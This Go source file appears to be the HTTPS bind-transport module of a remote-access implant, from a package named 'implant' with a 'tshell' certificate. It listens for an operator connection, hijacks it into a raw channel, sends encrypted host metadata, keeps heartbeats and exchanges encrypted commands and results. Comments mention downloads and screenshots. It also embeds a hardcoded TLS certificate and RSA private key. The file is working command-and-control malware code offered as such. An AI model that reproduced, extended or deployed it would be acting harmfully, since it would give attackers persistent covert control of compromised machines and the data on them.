//go:build transport_https_forward

package main

import (
	"sync"
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"
)

const httpsCertPEM = `-----BEGIN CERTIFICATE-----
MIIDHTCCAgWgAwIBAgIIGMeopu50YtgwDQYJKoZIhvcNAQELBQAwKDEPMA0GA1UE
ChMGdHNoZWxsMRUwEwYDVQQDEwx0c2hlbGwubG9jYWwwHhcNMjYwNzMxMTA0NjUy
WhcNMzYwODAxMTA0NjUyWjAoMQ8wDQYDVQQKEwZ0c2hlbGwxFTATBgNVBAMTDHRz
aGVsbC5sb2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKfXy6qj
PsGXocqWId8kCoARIR88GJsTQwYAnm10QSWyae0jgeXal2vrqeakPGo/G6u4XGsp
CRlMYVzeV8uSiBsKZbCptEhBDlzQg8nDX9Bz4MGnGA29bVPZGJU4B5jJPuU/spc7
glEgOExeqH1rhtbyMpLoLlRttkz0GmId1IfV3R5QnZI6L8Xyogl9Y/T1aNOE3OJi
iRZ+VK+OUfyVOsfeZu3VLKiAHxGuWRS3NB1z6yX2oGBdEgypMzBlvAabunOeJSWF
oH7TVfuwjUs6FiJ/ARr5GmRs5xcyK50Ea2M37xxki4aZ8AV/kyapPGg0NzEh2ZgO
Kk04yNpT2e5O0ykCAwEAAaNLMEkwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoG
CCsGAQUFBwMBMCIGA1UdEQQbMBmCCWxvY2FsaG9zdIIMdHNoZWxsLmxvY2FsMA0G
CSqGSIb3DQEBCwUAA4IBAQAaZ9vjXUsp8smAMb+QjE0SbAbtb8EQywDPH65uzFs8
nZix4XKpW3cU3KKFr8TDTYYw05X7jvXqT/HpiOHZLBHDu2u/G5FoxMhlz235tL3S
VfpGGyQv+tsvkEsrAtOxfrLU1TEJyZvCh48KXdObqKwf8uknxU/jvVPam+f2RPvy
UofgGfP9COrXMJsBZ8KYENMT4uOKZ9kavX64jPH7KEisS5s4JfhGpCdB+OcXXDLf
zOrKmAJwmpRiNRQJA2a6asVG7YBAw/nC8SyAG1f1JMi/ksorbcPPY5uEuNaZFlwA
gvp32wrzoEPfFxtXUg8kPxVABhFNfgErU5NyZq0iTwtR
-----END CERTIFICATE-----`

const httpsKeyPEM = `-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEAp9fLqqM+wZehypYh3yQKgBEhHzwYmxNDBgCebXRBJbJp7SOB
5dqXa+up5qQ8aj8bq7hcaykJGUxhXN5Xy5KIGwplsKm0SEEOXNCDycNf0HPgwacY
Db1tU9kYlTgHmMk+5T+ylzuCUSA4TF6ofWuG1vIykuguVG22TPQaYh3Uh9XdHlCd
kjovxfKiCX1j9PVo04Tc4mKJFn5Ur45R/JU6x95m7dUsqIAfEa5ZFLc0HXPrJfag
YF0SDKkzMGW8Bpu6c54lJYWgftNV+7CNSzoWIn8BGvkaZGznFzIrnQRrYzfvHGSL
hpnwBX+TJqk8aDQ3MSHZmA4qTTjI2lPZ7k7TKQIDAQABAoH/fbdlFaqwltC8nsFV
HY4hT0uFQ5//ziffS9+qytEI+vNn4/d0lHXmdS9PUzIxDmO2lijBEILsDcboJmdj
21cmGxrukCSMpJIV7+8+xyFP4xLohiRiH+iCuwshHqOZDRevxIaxfhVUxu8bPBiq
m0au+NDwkJjYGuUSZxFvsY4mYpbXLazFE17VsvYVxI3outAs84yv+kJdkFvT/SgZ
aKQjdc6Z4fFYnEoEUU/icDrJLhozgKjfN/BX3pqTjhSufyftg0OLaPEJSmg2MAbN
DPd8u0p1LfibGoUjhIJazj3bUUWx71n3BxRqEbjOgL4vA+YSFPCWuuOJIqqSgi+D
+nvBAoGBAMqio9rks8yV1pkC5oy6/+d4BDnZiqLle7+iXJ+2jMDEP60DwxLXBai7
xbVTnhlf8fyeDXYCUOGaNeguPJvdIlVXhuNENmGQ7En+9VmGdvmXz7WK2LIsRdAE
CH/BYmEQkXmk4cf7li2ymyJeojX5xjP/bgRnl4uikrOAtsbGh6AJAoGBANQLght1
mTKy4pTnB2sKRGai9kWLFYWihpCVDt3o7LX1AcYCtgJiJy8ZuaRr1be7UgcW8wMl
OdVAH0FzbpE0tJKcVe3fU1KlN3tW3UME0moLe07wrjYN7garf0lPUmMGtnaGd+IT
zMPLM2AgaOdhTYW5MsVGhZ5M7JCcW0pXgiIhAoGAPrwvwps/1z0knWa6fiN/Cuir
VkW1mE04DNJ1nrTjyuJ3XFdn07NieyT3RvZGYlDEGJPOUxTQeahGvEVkWlUSRh29
EyuRMo+tuBMJXtg0iX2ovunnwPHYA1jcUMFMdgStJV4Y0NNhYXCEexWVXuSfqoWQ
SCjSUFba2FwnOk9IuhECgYB9Ekyr5bF3Ngxvx9WYTXYLFBQu8NrA+BxnK4SZX8o/
iUSChxbUURDLt2DImtJ0jQjVJbQxJsP2BNxqvqt4+p2H3K7Sn+eF1+3h0lqwLSfv
ZNZWuaAIQi8jwARUOXVe85asUqRjtUoSMska6gL2d25CcfqAYhhuRvFCWvd94h/g
AQKBgF4Cyq3HyqOpwM+SIQGbzh6Rv++wFnsz1KogEsUe0qq/2881qxK/KcsjrANR
eavNHHV14OXF1zVp6FtNG5l2yrtukU6qtqEQGdZmafigU0Wgl+5U4LegeN13WPj9
fBxkSkP/AgS2XaZzS+My85TrH3PkE5KswGNtsiBMVFpzhHJR
-----END RSA PRIVATE KEY-----`
// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
const listenerType = "https_forward"

// NewTransport 构造 https_forward 传输（单二进制 build tag 入口）
func NewTransport() transportClient {
	return &HTTPSForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (c *HTTPSForwardClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *HTTPSForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

type HTTPSForwardClient struct {
	Listener     net.Listener
	Server       *http.Server
	Connection   net.Conn
	reader       *bufio.Reader
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{}
	connectedCh  chan error
	sendMutex    sync.Mutex // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
}

func (c *HTTPSForwardClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
}

// Connect 在 spec（listenAddr:port）上启动 HTTPS 服务，等待服务端拨号并 Hijack 成原始连接。
func (c *HTTPSForwardClient) Connect(spec string) error {
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/HTTP服务/旧连接：fail() 只清理连接，runLoop 重连时
	// 旧 Listener 仍占用端口 → net.Listen EADDRINUSE 永久失败
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	c.connectedCh = make(chan error, 1)

	cert, err := tls.X509KeyPair([]byte(httpsCertPEM), []byte(httpsKeyPEM))
	if err != nil {
		c.fail()
		return err
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", c.handleConn)
	mux.HandleFunc("/favicon.ico", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})

	ln, err := tls.Listen("tcp", spec, &tls.Config{Certificates: []tls.Certificate{cert}})
	if err != nil {
		c.fail()
		return err
	}
	c.Listener = ln
	c.Server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 15 * time.Second,
	}
	go func() {
		if err := c.Server.Serve(ln); err != nil && err != http.ErrServerClosed {
			debuglog.Printf("❌ [HTTPS-FORWARD] HTTPS 服务退出: %v\n", err)
		}
	}()
	debuglog.Printf("✅ [HTTPS-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	// 阻塞等待服务端拨号（与 TCP/KCP/WS 正向 Accept 语义一致）
	err = <-c.connectedCh
	if err != nil {
		c.fail()
		return err
	}
	return nil
}

// handleConn 服务端拨号后的 HTTPS handler：Hijack 连接并转为原始协议流
func (c *HTTPSForwardClient) handleConn(w http.ResponseWriter, r *http.Request) {
	hj, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "hijack unsupported", http.StatusInternalServerError)
		select {
		case c.connectedCh <- fmt.Errorf("hijack unsupported"):
		default:
		}
		return
	}
	conn, buf, err := hj.Hijack()
	if err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	// 返回 HTTP 200 完成握手，此后连接转为原始协议流
	if _, err := conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")); err != nil {
		conn.Close()
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	c.Connection = conn
	c.reader = buf.Reader
	c.connected = true
	debuglog.Printf("✅ [HTTPS-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			c.fail()
			select {
			case c.connectedCh <- metaErr:
			default:
			}
			return
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			c.fail()
			select {
			case c.connectedCh <- metaErr2:
			default:
			}
			return
		}
		utils.MetaInfo = metaB64
	}
	if err := c.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}

	// 会话密钥（https_forward 用占位符 key，与服务端 https_forward 分支一致）
	salt, masterKey := app.GetListenerKeyConfig("https_forward")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
	if c.stopCh != nil {
		close(c.stopCh)
	}
	c.stopCh = make(chan struct{})
stop := c.stopCh
	go app.HeartbeatLoop(stop, c.keepAlive)

	select {
	case c.connectedCh <- nil:
	default:
	}
}

// Recv 读取一条命令：4字节长度 + 载荷 + base64 + 解密。
func (c *HTTPSForwardClient) Recv() ([]byte, error) {
	if c.Connection == nil || !c.connected {
		c.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读超时：服务端每心跳回复 ack，健康连接不会超时；超时说明服务端半开/死亡，触发重连
	if err := c.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		c.fail()
		return nil, err
	}
	// 【P2-5】共享帧管线：长度前缀 + 上限校验（K3，原缺失 OOM 洞）+ 载荷读取 + 解码
	total, err := communication.ReadFramedLength(c.reader)
	if err != nil {
		c.fail()
		return nil, err
	}
	if total == 0 {
		return nil, nil
	}
	if total > 1<<20 {
		// 大消息（下载/截图等）：按传输速率放宽读超时，避免慢链路误判超时
		c.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline() + time.Duration(total/50_000)*time.Second))
	}
	payload, err := communication.ReadFramedPayload(c.reader, total)
	if err != nil {
		c.fail()
		return nil, err
	}
	return communication.DecodeFramePayload(payload)
}

// SendResult 按 TCP 协议分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再分块写。
func (c *HTTPSForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return c.rawSend(msgToSend)
}

func (c *HTTPSForwardClient) rawSend(msg []byte) error {
	c.sendMutex.Lock()
	defer c.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if c.Connection == nil {
		return fmt.Errorf("连接为空")
	}
	msgToSend := utils.BytesCombine(utils.WriteInt(len(msg)), msg)
	// 【P2-5】共享分块写（50KB/块）
	if err := communication.WriteChunked(c.Connection, msgToSend); err != nil {
		c.fail()
		return err
	}
	return nil
}

func (c *HTTPSForwardClient) keepAlive() {
		c.rawSend(communication.HeartbeatMsg())
}

func (c *HTTPSForwardClient) Close() error {
	if c.stopCh != nil {
		close(c.stopCh)
		c.stopCh = nil
	}
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	return nil
}